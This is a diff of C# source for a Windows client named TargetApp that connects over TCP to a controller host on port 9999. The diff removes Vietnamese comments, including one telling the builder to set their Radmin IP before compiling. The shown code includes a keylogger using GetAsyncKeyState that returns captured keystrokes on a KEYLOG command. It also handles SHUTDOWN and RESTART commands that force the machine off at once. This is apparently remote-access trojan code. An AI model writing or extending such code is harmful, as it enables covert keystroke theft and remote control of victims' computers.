@@ -16,14 +16,12 @@ namespace TargetApp
 {
     public partial class Form1 : Form
     {
-        // --- CẤU HÌNH KẾT NỐI ---
-        const string HOST_IP = "127.0.0.1"; // NHỚ ĐỔI IP RADMIN CỦA BẠN TRƯỚC KHI BUILD
+        const string HOST_IP = "127.0.0.1"; 
         const int HOST_PORT = 9999;
 
         TcpClient client;
         NetworkStream stream;
 
-        // Cấu hình Webcam & Keylog
         [DllImport("User32.dll")] public static extern int GetAsyncKeyState(Int32 i);
         System.Windows.Forms.Timer keylogTimer = new System.Windows.Forms.Timer();
         StringBuilder keyLogBuffer = new StringBuilder();
@@ -163,11 +161,11 @@ namespace TargetApp
 
                 case "KEYLOG": string k = keyLogBuffer.ToString(); keyLogBuffer.Clear(); return k;
 
-                // --- ĐÃ THÊM: LỆNH TẮT MÁY ---
+                
                 case "SHUTDOWN":
                     try
                     {
-                        Process.Start("shutdown", "/s /t 0"); // /s: shutdown, /t 0: ngay lập tức
+                        Process.Start("shutdown", "/s /t 0");
                         return "OK: Máy tính sẽ tắt ngay lập tức.";
                     }
                     catch (Exception ex)
@@ -175,11 +173,11 @@ namespace TargetApp
                         return "Lỗi: Không thể tắt máy. Chi tiết: " + ex.Message;
                     }
 
-                // --- ĐÃ THÊM: LỆNH RESTART MÁY ---
+                
                 case "RESTART":
                     try
                     {
-                        Process.Start("shutdown", "/r /t 0"); // /r: restart, /t 0: ngay lập tức
+                        Process.Start("shutdown", "/r /t 0"); 
                         return "OK: Máy tính sẽ khởi động lại ngay lập tức.";
                     }
                     catch (Exception ex)
